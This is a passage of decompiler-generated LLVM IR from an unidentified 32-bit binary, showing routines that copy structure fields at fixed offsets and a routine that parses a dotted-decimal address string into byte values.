  %v0_1000a17c = call i32 @function_10008484()
  %v0_1000a180 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000a180 = inttoptr i32 %v0_1000a17c to i32*
  store i32 %v0_1000a180, i32* %v2_1000a180, align 4
  br label %dec_label_pc_1000a188

dec_label_pc_1000a188:                            ; preds = %dec_label_pc_1000a154, %dec_label_pc_1000a17c
  %v0_1000a198 = phi i32 [ %v0_1000a16c, %dec_label_pc_1000a154 ], [ -1, %dec_label_pc_1000a17c ]
  ret i32 %v0_1000a198

; uselistorder directives
  uselistorder label %dec_label_pc_1000a188, { 1, 0 }
}

define i32 @function_1000a19c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000a19c:
  %r10.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* %r28.global-to-local, align 4
  store i32 268476868, i32* @lr, align 4
  %v3_1000a1c0 = call i32 @function_10008608(i32 %arg2, i32 0, i32 104)
  %v2_1000a1c4 = load i32, i32* %arg1, align 4
  %v1_1000a1c8 = add i32 %tmp, 4
  %v2_1000a1c8 = inttoptr i32 %v1_1000a1c8 to i32*
  %v3_1000a1c8 = load i32, i32* %v2_1000a1c8, align 4
  store i32 %v3_1000a1c8, i32* %r10.global-to-local, align 4
  %v1_1000a1cc = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a1cc = inttoptr i32 %v1_1000a1cc to i32*
  store i32 %v2_1000a1c4, i32* %v2_1000a1cc, align 4
  %v0_1000a1d0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a1d0 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a1d0 = add i32 %v1_1000a1d0, 4
  %v3_1000a1d0 = inttoptr i32 %v2_1000a1d0 to i32*
  store i32 %v0_1000a1d0, i32* %v3_1000a1d0, align 4
  %v0_1000a1d4 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a1d4 = add i32 %v0_1000a1d4, 8
  %v2_1000a1d4 = inttoptr i32 %v1_1000a1d4 to i32*
  %v3_1000a1d4 = load i32, i32* %v2_1000a1d4, align 4
  %v1_1000a1d8 = add i32 %v0_1000a1d4, 12
  %v2_1000a1d8 = inttoptr i32 %v1_1000a1d8 to i32*
  %v3_1000a1d8 = load i32, i32* %v2_1000a1d8, align 4
  store i32 %v3_1000a1d8, i32* %r10.global-to-local, align 4
  %v1_1000a1dc = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a1dc = add i32 %v1_1000a1dc, 8
  %v3_1000a1dc = inttoptr i32 %v2_1000a1dc to i32*
  store i32 %v3_1000a1d4, i32* %v3_1000a1dc, align 4
  %v0_1000a1e0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a1e0 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a1e0 = add i32 %v1_1000a1e0, 12
  %v3_1000a1e0 = inttoptr i32 %v2_1000a1e0 to i32*
  store i32 %v0_1000a1e0, i32* %v3_1000a1e0, align 4
  %v0_1000a1e4 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a1e4 = add i32 %v0_1000a1e4, 16
  %v2_1000a1e4 = inttoptr i32 %v1_1000a1e4 to i32*
  %v3_1000a1e4 = load i32, i32* %v2_1000a1e4, align 4
  %v1_1000a1e8 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a1e8 = add i32 %v1_1000a1e8, 16
  %v3_1000a1e8 = inttoptr i32 %v2_1000a1e8 to i32*
  store i32 %v3_1000a1e4, i32* %v3_1000a1e8, align 4
  %v0_1000a1ec = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a1ec = add i32 %v0_1000a1ec, 20
  %v2_1000a1ec = inttoptr i32 %v1_1000a1ec to i32*
  %v3_1000a1ec = load i32, i32* %v2_1000a1ec, align 4
  %v1_1000a1f0 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a1f0 = add i32 %v1_1000a1f0, 20
  %v3_1000a1f0 = inttoptr i32 %v2_1000a1f0 to i32*
  store i32 %v3_1000a1ec, i32* %v3_1000a1f0, align 4
  %v0_1000a1f4 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a1f4 = add i32 %v0_1000a1f4, 24
  %v2_1000a1f4 = inttoptr i32 %v1_1000a1f4 to i32*
  %v3_1000a1f4 = load i32, i32* %v2_1000a1f4, align 4
  %v1_1000a1f8 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a1f8 = add i32 %v1_1000a1f8, 24
  %v3_1000a1f8 = inttoptr i32 %v2_1000a1f8 to i32*
  store i32 %v3_1000a1f4, i32* %v3_1000a1f8, align 4
  %v0_1000a1fc = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a1fc = add i32 %v0_1000a1fc, 28
  %v2_1000a1fc = inttoptr i32 %v1_1000a1fc to i32*
  %v3_1000a1fc = load i32, i32* %v2_1000a1fc, align 4
  %v1_1000a200 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a200 = add i32 %v1_1000a200, 28
  %v3_1000a200 = inttoptr i32 %v2_1000a200 to i32*
  store i32 %v3_1000a1fc, i32* %v3_1000a200, align 4
  %v0_1000a204 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a204 = add i32 %v0_1000a204, 32
  %v2_1000a204 = inttoptr i32 %v1_1000a204 to i32*
  %v3_1000a204 = load i32, i32* %v2_1000a204, align 4
  %v1_1000a208 = add i32 %v0_1000a204, 36
  %v2_1000a208 = inttoptr i32 %v1_1000a208 to i32*
  %v3_1000a208 = load i32, i32* %v2_1000a208, align 4
  store i32 %v3_1000a208, i32* %r10.global-to-local, align 4
  %v1_1000a20c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a20c = add i32 %v1_1000a20c, 32
  %v3_1000a20c = inttoptr i32 %v2_1000a20c to i32*
  store i32 %v3_1000a204, i32* %v3_1000a20c, align 4
  %v0_1000a210 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a210 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a210 = add i32 %v1_1000a210, 36
  %v3_1000a210 = inttoptr i32 %v2_1000a210 to i32*
  store i32 %v0_1000a210, i32* %v3_1000a210, align 4
  %v0_1000a214 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a214 = add i32 %v0_1000a214, 48
  %v2_1000a214 = inttoptr i32 %v1_1000a214 to i32*
  %v3_1000a214 = load i32, i32* %v2_1000a214, align 4
  %v1_1000a218 = add i32 %v0_1000a214, 52
  %v2_1000a218 = inttoptr i32 %v1_1000a218 to i32*
  %v3_1000a218 = load i32, i32* %v2_1000a218, align 4
  store i32 %v3_1000a218, i32* %r10.global-to-local, align 4
  %v1_1000a21c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a21c = add i32 %v1_1000a21c, 48
  %v3_1000a21c = inttoptr i32 %v2_1000a21c to i32*
  store i32 %v3_1000a214, i32* %v3_1000a21c, align 4
  %v0_1000a220 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a220 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a220 = add i32 %v1_1000a220, 52
  %v3_1000a220 = inttoptr i32 %v2_1000a220 to i32*
  store i32 %v0_1000a220, i32* %v3_1000a220, align 4
  %v0_1000a224 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a224 = add i32 %v0_1000a224, 56
  %v2_1000a224 = inttoptr i32 %v1_1000a224 to i32*
  %v3_1000a224 = load i32, i32* %v2_1000a224, align 4
  %v1_1000a228 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a228 = add i32 %v1_1000a228, 56
  %v3_1000a228 = inttoptr i32 %v2_1000a228 to i32*
  store i32 %v3_1000a224, i32* %v3_1000a228, align 4
  %v0_1000a22c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a22c = add i32 %v0_1000a22c, 64
  %v2_1000a22c = inttoptr i32 %v1_1000a22c to i32*
  %v3_1000a22c = load i32, i32* %v2_1000a22c, align 4
  %v1_1000a230 = add i32 %v0_1000a22c, 68
  %v2_1000a230 = inttoptr i32 %v1_1000a230 to i32*
  %v3_1000a230 = load i32, i32* %v2_1000a230, align 4
  store i32 %v3_1000a230, i32* %r10.global-to-local, align 4
  %v1_1000a234 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a234 = add i32 %v1_1000a234, 64
  %v3_1000a234 = inttoptr i32 %v2_1000a234 to i32*
  store i32 %v3_1000a22c, i32* %v3_1000a234, align 4
  %v0_1000a238 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a238 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a238 = add i32 %v1_1000a238, 68
  %v3_1000a238 = inttoptr i32 %v2_1000a238 to i32*
  store i32 %v0_1000a238, i32* %v3_1000a238, align 4
  %v0_1000a23c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a23c = add i32 %v0_1000a23c, 72
  %v2_1000a23c = inttoptr i32 %v1_1000a23c to i32*
  %v3_1000a23c = load i32, i32* %v2_1000a23c, align 4
  %v1_1000a240 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a240 = add i32 %v1_1000a240, 72
  %v3_1000a240 = inttoptr i32 %v2_1000a240 to i32*
  store i32 %v3_1000a23c, i32* %v3_1000a240, align 4
  %v0_1000a244 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a244 = add i32 %v0_1000a244, 80
  %v2_1000a244 = inttoptr i32 %v1_1000a244 to i32*
  %v3_1000a244 = load i32, i32* %v2_1000a244, align 4
  %v1_1000a248 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a248 = add i32 %v1_1000a248, 80
  %v3_1000a248 = inttoptr i32 %v2_1000a248 to i32*
  store i32 %v3_1000a244, i32* %v3_1000a248, align 4
  %v0_1000a24c = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a24c = add i32 %v0_1000a24c, 88
  %v2_1000a24c = inttoptr i32 %v1_1000a24c to i32*
  %v3_1000a24c = load i32, i32* %v2_1000a24c, align 4
  %v1_1000a250 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a250 = add i32 %v1_1000a250, 88
  %v3_1000a250 = inttoptr i32 %v2_1000a250 to i32*
  store i32 %v3_1000a24c, i32* %v3_1000a250, align 4
  ret i32 %v3_1000a1c0

; uselistorder directives
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 80, { 1, 2, 3, 0 }
  uselistorder i32 104, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_1000a268(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000a268:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000a26c = load i32, i32* @lr, align 4
  store i32 %v0_1000a26c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 268477072, i32* @lr, align 4
  %v3_1000a28c = call i32 @function_10008608(i32 %arg2, i32 0, i32 88)
  %v0_1000a290 = load i32, i32* @r28, align 4
  %v1_1000a290 = inttoptr i32 %v0_1000a290 to i32*
  %v2_1000a290 = load i32, i32* %v1_1000a290, align 4
  store i32 %v2_1000a290, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1000a298 = load i32, i32* @r29, align 4
  %v2_1000a298 = add i32 %v1_1000a298, 4
  %v3_1000a298 = inttoptr i32 %v2_1000a298 to i32*
  store i32 %v2_1000a290, i32* %v3_1000a298, align 4
  %v0_1000a29c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a29c = load i32, i32* @r29, align 4
  %v2_1000a29c = inttoptr i32 %v1_1000a29c to i32*
  store i32 %v0_1000a29c, i32* %v2_1000a29c, align 4
  %v0_1000a2a0 = load i32, i32* @r28, align 4
  %v1_1000a2a0 = add i32 %v0_1000a2a0, 4
  %v2_1000a2a0 = inttoptr i32 %v1_1000a2a0 to i32*
  %v3_1000a2a0 = load i32, i32* %v2_1000a2a0, align 4
  store i32 %v3_1000a2a0, i32* %r0.global-to-local, align 4
  %v1_1000a2a4 = load i32, i32* @r29, align 4
  %v2_1000a2a4 = add i32 %v1_1000a2a4, 12
  %v3_1000a2a4 = inttoptr i32 %v2_1000a2a4 to i32*
  store i32 %v3_1000a2a0, i32* %v3_1000a2a4, align 4
  %v0_1000a2a8 = load i32, i32* @r28, align 4
  %v1_1000a2a8 = add i32 %v0_1000a2a8, 8
  %v2_1000a2a8 = inttoptr i32 %v1_1000a2a8 to i32*
  %v3_1000a2a8 = load i32, i32* %v2_1000a2a8, align 4
  store i32 %v3_1000a2a8, i32* %r0.global-to-local, align 4
  %v1_1000a2ac = load i32, i32* @r29, align 4
  %v2_1000a2ac = add i32 %v1_1000a2ac, 16
  %v3_1000a2ac = inttoptr i32 %v2_1000a2ac to i32*
  store i32 %v3_1000a2a8, i32* %v3_1000a2ac, align 4
  %v0_1000a2b0 = load i32, i32* @r28, align 4
  %v1_1000a2b0 = add i32 %v0_1000a2b0, 12
  %v2_1000a2b0 = inttoptr i32 %v1_1000a2b0 to i16*
  %v3_1000a2b0 = load i16, i16* %v2_1000a2b0, align 2
  %v4_1000a2b0 = zext i16 %v3_1000a2b0 to i32
  store i32 %v4_1000a2b0, i32* %r0.global-to-local, align 4
  %v1_1000a2b4 = load i32, i32* @r29, align 4
  %v2_1000a2b4 = add i32 %v1_1000a2b4, 20
  %v3_1000a2b4 = inttoptr i32 %v2_1000a2b4 to i32*
  store i32 %v4_1000a2b0, i32* %v3_1000a2b4, align 4
  %v0_1000a2b8 = load i32, i32* @r28, align 4
  %v1_1000a2b8 = add i32 %v0_1000a2b8, 16
  %v2_1000a2b8 = inttoptr i32 %v1_1000a2b8 to i32*
  %v3_1000a2b8 = load i32, i32* %v2_1000a2b8, align 4
  store i32 %v3_1000a2b8, i32* %r0.global-to-local, align 4
  %v1_1000a2bc = load i32, i32* @r29, align 4
  %v2_1000a2bc = add i32 %v1_1000a2bc, 24
  %v3_1000a2bc = inttoptr i32 %v2_1000a2bc to i32*
  store i32 %v3_1000a2b8, i32* %v3_1000a2bc, align 4
  %v0_1000a2c0 = load i32, i32* @r28, align 4
  %v1_1000a2c0 = add i32 %v0_1000a2c0, 20
  %v2_1000a2c0 = inttoptr i32 %v1_1000a2c0 to i32*
  %v3_1000a2c0 = load i32, i32* %v2_1000a2c0, align 4
  store i32 %v3_1000a2c0, i32* %r0.global-to-local, align 4
  %v1_1000a2c4 = load i32, i32* @r29, align 4
  %v2_1000a2c4 = add i32 %v1_1000a2c4, 28
  %v3_1000a2c4 = inttoptr i32 %v2_1000a2c4 to i32*
  store i32 %v3_1000a2c0, i32* %v3_1000a2c4, align 4
  %v0_1000a2c8 = load i32, i32* @r28, align 4
  %v1_1000a2c8 = add i32 %v0_1000a2c8, 24
  %v2_1000a2c8 = inttoptr i32 %v1_1000a2c8 to i32*
  %v3_1000a2c8 = load i32, i32* %v2_1000a2c8, align 4
  store i32 %v3_1000a2c8, i32* %r0.global-to-local, align 4
  %v0_1000a2cc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a2cc = load i32, i32* @r29, align 4
  %v2_1000a2cc = add i32 %v1_1000a2cc, 32
  %v3_1000a2cc = inttoptr i32 %v2_1000a2cc to i32*
  store i32 %v0_1000a2cc, i32* %v3_1000a2cc, align 4
  %v0_1000a2d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a2d0 = load i32, i32* @r29, align 4
  %v2_1000a2d0 = add i32 %v1_1000a2d0, 36
  %v3_1000a2d0 = inttoptr i32 %v2_1000a2d0 to i32*
  store i32 %v0_1000a2d0, i32* %v3_1000a2d0, align 4
  %v0_1000a2d4 = load i32, i32* @r28, align 4
  %v1_1000a2d4 = add i32 %v0_1000a2d4, 28
  %v2_1000a2d4 = inttoptr i32 %v1_1000a2d4 to i32*
  %v3_1000a2d4 = load i32, i32* %v2_1000a2d4, align 4
  store i32 %v3_1000a2d4, i32* %r0.global-to-local, align 4
  %v1_1000a2d8 = load i32, i32* @r29, align 4
  %v2_1000a2d8 = add i32 %v1_1000a2d8, 44
  %v3_1000a2d8 = inttoptr i32 %v2_1000a2d8 to i32*
  store i32 %v3_1000a2d4, i32* %v3_1000a2d8, align 4
  %v0_1000a2dc = load i32, i32* @r28, align 4
  %v1_1000a2dc = add i32 %v0_1000a2dc, 32
  %v2_1000a2dc = inttoptr i32 %v1_1000a2dc to i32*
  %v3_1000a2dc = load i32, i32* %v2_1000a2dc, align 4
  store i32 %v3_1000a2dc, i32* %r0.global-to-local, align 4
  %v1_1000a2e0 = load i32, i32* @r29, align 4
  %v2_1000a2e0 = add i32 %v1_1000a2e0, 48
  %v3_1000a2e0 = inttoptr i32 %v2_1000a2e0 to i32*
  store i32 %v3_1000a2dc, i32* %v3_1000a2e0, align 4
  %v0_1000a2e4 = load i32, i32* @r28, align 4
  %v1_1000a2e4 = add i32 %v0_1000a2e4, 36
  %v2_1000a2e4 = inttoptr i32 %v1_1000a2e4 to i32*
  %v3_1000a2e4 = load i32, i32* %v2_1000a2e4, align 4
  store i32 %v3_1000a2e4, i32* %r0.global-to-local, align 4
  %v1_1000a2e8 = load i32, i32* @r29, align 4
  %v2_1000a2e8 = add i32 %v1_1000a2e8, 52
  %v3_1000a2e8 = inttoptr i32 %v2_1000a2e8 to i32*
  store i32 %v3_1000a2e4, i32* %v3_1000a2e8, align 4
  %v0_1000a2ec = load i32, i32* @r28, align 4
  %v1_1000a2ec = add i32 %v0_1000a2ec, 40
  %v2_1000a2ec = inttoptr i32 %v1_1000a2ec to i32*
  %v3_1000a2ec = load i32, i32* %v2_1000a2ec, align 4
  store i32 %v3_1000a2ec, i32* %r0.global-to-local, align 4
  %v1_1000a2f0 = load i32, i32* @r29, align 4
  %v2_1000a2f0 = add i32 %v1_1000a2f0, 56
  %v3_1000a2f0 = inttoptr i32 %v2_1000a2f0 to i32*
  store i32 %v3_1000a2ec, i32* %v3_1000a2f0, align 4
  %v0_1000a2f4 = load i32, i32* @r28, align 4
  %v1_1000a2f4 = add i32 %v0_1000a2f4, 48
  %v2_1000a2f4 = inttoptr i32 %v1_1000a2f4 to i32*
  %v3_1000a2f4 = load i32, i32* %v2_1000a2f4, align 4
  store i32 %v3_1000a2f4, i32* %r0.global-to-local, align 4
  %v1_1000a2f8 = load i32, i32* @r29, align 4
  %v2_1000a2f8 = add i32 %v1_1000a2f8, 64
  %v3_1000a2f8 = inttoptr i32 %v2_1000a2f8 to i32*
  store i32 %v3_1000a2f4, i32* %v3_1000a2f8, align 4
  %v0_1000a2fc = load i32, i32* @r28, align 4
  %v1_1000a2fc = add i32 %v0_1000a2fc, 56
  %v2_1000a2fc = inttoptr i32 %v1_1000a2fc to i32*
  %v3_1000a2fc = load i32, i32* %v2_1000a2fc, align 4
  %v1_1000a300 = load i32, i32* @r29, align 4
  %v2_1000a300 = add i32 %v1_1000a300, 72
  %v3_1000a300 = inttoptr i32 %v2_1000a300 to i32*
  store i32 %v3_1000a2fc, i32* %v3_1000a300, align 4
  store i32 %v0_1000a26c, i32* %r0.global-to-local, align 4
  ret i32 %v3_1000a28c

; uselistorder directives
  uselistorder i32 72, { 2, 0, 1 }
  uselistorder i32 64, { 11, 7, 8, 0, 13, 9, 10, 1, 12, 2, 3, 4, 5, 6 }
  uselistorder i32 56, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 40, { 7, 0, 2, 1, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 4, 18, 5, 19, 3, 20, 21, 6, 22 }
  uselistorder i32 52, { 5, 1, 2, 3, 4, 6, 7, 0, 8 }
  uselistorder i32 48, { 6, 7, 3, 4, 8, 0, 10, 1, 2, 5, 9 }
  uselistorder i32 36, { 6, 7, 3, 4, 5, 1, 8, 2, 9, 10, 11, 12, 13, 0, 14 }
  uselistorder i32 24, { 7, 8, 4, 5, 1, 2, 6, 51, 52, 53, 54, 55, 56, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 3, 57, 58, 59, 0 }
  uselistorder i32 20, { 13, 14, 9, 10, 11, 12, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 4, 31, 32, 33, 34, 35, 36, 37, 38, 5, 39, 40, 41, 42, 43, 44, 6, 45, 46, 47, 48, 49, 50, 51, 52, 0, 7, 53, 54, 55, 1, 8, 56, 57, 58, 59, 60, 61, 62, 63, 2 }
  uselistorder i32 16, { 49, 50, 39, 40, 51, 52, 53, 54, 55, 8, 48, 44, 124, 125, 56, 57, 24, 25, 26, 41, 27, 28, 42, 43, 114, 115, 47, 29, 45, 46, 30, 31, 32, 33, 34, 35, 36, 37, 10, 97, 98, 99, 100, 101, 58, 59, 11, 60, 61, 62, 63, 13, 64, 12, 65, 66, 15, 67, 68, 0, 69, 70, 71, 14, 72, 73, 17, 74, 75, 76, 77, 78, 16, 21, 79, 80, 81, 1, 82, 83, 2, 3, 9, 85, 84, 18, 20, 19, 86, 87, 4, 88, 22, 89, 90, 91, 5, 92, 95, 96, 93, 94, 102, 103, 6, 104, 23, 105, 106, 107, 7, 108, 111, 112, 109, 110, 113, 38, 116, 117, 118, 119, 120, 121, 122, 123 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_1000a318(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1000a318:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268477236, i32* @lr, align 4
  %v0_1000a330 = call i32 @function_100084c8()
  %v0_1000a338 = load i32, i32* @r28, align 4
  %v1_1000a338 = load i32, i32* @r29, align 4
  %v2_1000a338 = add i32 %v1_1000a338, %v0_1000a338
  ret i32 %v2_1000a338

; uselistorder directives
  uselistorder i32* @r28, { 13, 14, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 1, 50, 51, 52, 53, 54, 55, 217, 218, 219, 220, 221, 2, 28, 29, 30, 8, 31, 171, 172, 173, 174, 175, 176, 177, 178, 179, 190, 191, 192, 203, 15, 16, 17, 18, 19, 56, 57, 9, 10, 11, 12, 3, 26, 20, 0, 21, 22, 23, 24, 4, 25, 27, 32, 33, 34, 35, 58, 59, 60, 61, 62, 63, 64, 5, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 78, 79, 76, 77, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 195, 193, 194, 196, 197, 7, 198, 199, 200, 201, 202, 6, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216 }
}

define i32 @function_1000a34c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000a34c:
  %r5.global-to-local = alloca i32, align 4
  %v3_1000a34c = icmp eq i8* %arg1, null
  br i1 %v3_1000a34c, label %dec_label_pc_1000a404, label %dec_label_pc_1000a354

dec_label_pc_1000a354:                            ; preds = %dec_label_pc_1000a34c
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1000a368.pre = load i32, i32* bitcast (i32** @global_var_1001b284.382 to i32*), align 4
  br label %dec_label_pc_1000a364

dec_label_pc_1000a364:                            ; preds = %dec_label_pc_1000a354, %dec_label_pc_1000a3dc
  %v0_1000a3dc = phi i32 [ 0, %dec_label_pc_1000a354 ], [ %v2_1000a3e4, %dec_label_pc_1000a3dc ]
  %v0_1000a3e0 = phi i32 [ 1, %dec_label_pc_1000a354 ], [ %v1_1000a3e0, %dec_label_pc_1000a3dc ]
  %v0_1000a364 = phi i32 [ %tmp, %dec_label_pc_1000a354 ], [ %v0_1000a3643, %dec_label_pc_1000a3dc ]
  %v1_1000a364 = inttoptr i32 %v0_1000a364 to i8*
  %v2_1000a364 = load i8, i8* %v1_1000a364, align 1
  %v3_1000a364 = zext i8 %v2_1000a364 to i32
  %v1_1000a36c = mul nuw nsw i32 %v3_1000a364, 2
  %v2_1000a370 = add i32 %v1_1000a36c, %v3_1000a368.pre
  %v3_1000a370 = inttoptr i32 %v2_1000a370 to i16*
  %v4_1000a370 = load i16, i16* %v3_1000a370, align 2
  %v1_1000a374 = and i16 %v4_1000a370, 8
  %v3_1000a374 = icmp eq i16 %v1_1000a374, 0
  br i1 %v3_1000a374, label %dec_label_pc_1000a404, label %dec_label_pc_1000a37c

dec_label_pc_1000a37c:                            ; preds = %dec_label_pc_1000a364
  br label %dec_label_pc_1000a394

dec_label_pc_1000a384:                            ; preds = %dec_label_pc_1000a394
  %v1_1000a398 = mul i32 %v1_1000a3e4, 10
  %v2_1000a3a0 = add i32 %v3_1000a394, %v1_1000a398
  %v1_1000a384 = add i32 %v2_1000a3a0, -48
  %v1_1000a388 = add i32 %v0_1000a3cc, 1
  %v2_1000a38c = icmp sgt i32 %v1_1000a384, 255
  br i1 %v2_1000a38c, label %dec_label_pc_1000a404, label %dec_label_pc_1000a394

dec_label_pc_1000a394:                            ; preds = %dec_label_pc_1000a384, %dec_label_pc_1000a37c
  %v1_1000a3e4 = phi i32 [ %v1_1000a384, %dec_label_pc_1000a384 ], [ 0, %dec_label_pc_1000a37c ]
  %v0_1000a3cc = phi i32 [ %v1_1000a388, %dec_label_pc_1000a384 ], [ %v0_1000a364, %dec_label_pc_1000a37c ]
  %v1_1000a394 = inttoptr i32 %v0_1000a3cc to i8*
  %v2_1000a394 = load i8, i8* %v1_1000a394, align 1
  %v3_1000a394 = zext i8 %v2_1000a394 to i32
  %v1_1000a39c = mul nuw nsw i32 %v3_1000a394, 2
  %v2_1000a3a4 = add i32 %v1_1000a39c, %v3_1000a368.pre
  %v3_1000a3a4 = inttoptr i32 %v2_1000a3a4 to i16*
  %v4_1000a3a4 = load i16, i16* %v3_1000a3a4, align 2
  %v5_1000a3a4 = zext i16 %v4_1000a3a4 to i32
  %v1_1000a3a8 = and i32 %v5_1000a3a4, 8
  %v3_1000a3a8 = icmp eq i32 %v1_1000a3a8, 0
  br i1 %v3_1000a3a8, label %dec_label_pc_1000a3b0, label %dec_label_pc_1000a384

dec_label_pc_1000a3b0:                            ; preds = %dec_label_pc_1000a394
  %v2_1000a3b0 = icmp sgt i32 %v0_1000a3e0, 3
  br i1 %v2_1000a3b0, label %dec_label_pc_1000a3c8, label %dec_label_pc_1000a3b8

dec_label_pc_1000a3b8:                            ; preds = %dec_label_pc_1000a3b0
  %v3_1000a3b8 = icmp eq i8 %v2_1000a394, 46
  br i1 %v3_1000a3b8, label %dec_label_pc_1000a3c0, label %dec_label_pc_1000a404

dec_label_pc_1000a3c0:                            ; preds = %dec_label_pc_1000a3b8
  %v1_1000a3c0 = add i32 %v0_1000a3cc, 1
  br label %dec_label_pc_1000a3dc

dec_label_pc_1000a3c8:                            ; preds = %dec_label_pc_1000a3b0
  %v3_1000a3c8 = icmp eq i8 %v2_1000a394, 0
  %v1_1000a3cc = add i32 %v0_1000a3cc, 1
  br i1 %v3_1000a3c8, label %dec_label_pc_1000a3dc, label %dec_label_pc_1000a3d4

dec_label_pc_1000a3d4:                            ; preds = %dec_label_pc_1000a3c8
  %v1_1000a3d4 = and i32 %v5_1000a3a4, 32
  %v3_1000a3d4 = icmp eq i32 %v1_1000a3d4, 0
  br i1 %v3_1000a3d4, label %dec_label_pc_1000a404, label %dec_label_pc_1000a3dc

dec_label_pc_1000a3dc:                            ; preds = %dec_label_pc_1000a3d4, %dec_label_pc_1000a3c8, %dec_label_pc_1000a3c0
  %v0_1000a3643 = phi i32 [ %v1_1000a3cc, %dec_label_pc_1000a3d4 ], [ %v1_1000a3cc, %dec_label_pc_1000a3c8 ], [ %v1_1000a3c0, %dec_label_pc_1000a3c0 ]
  %v1_1000a3dc = mul i32 %v0_1000a3dc, 256
  %v1_1000a3e0 = add nuw nsw i32 %v0_1000a3e0, 1
  %v2_1000a3e4 = or i32 %v1_1000a3e4, %v1_1000a3dc
  store i32 %v2_1000a3e4, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_1000a3e0, 5
  br i1 %tmp10, label %dec_label_pc_1000a364, label %dec_label_pc_1000a3f0

dec_label_pc_1000a3f0:                            ; preds = %dec_label_pc_1000a3dc
  %v0_1000a3f0 = load i32, i32* @r4, align 4
  %v3_1000a3f0 = icmp eq i32 %v0_1000a3f0, 0
  %v0_1000a3f8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000a3f0, i32 %v0_1000a3f8)
  %v0_1000a3fc = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a3fc = load i32, i32* @r4, align 4
  %v2_1000a3fc = inttoptr i32 %v1_1000a3fc to i32*
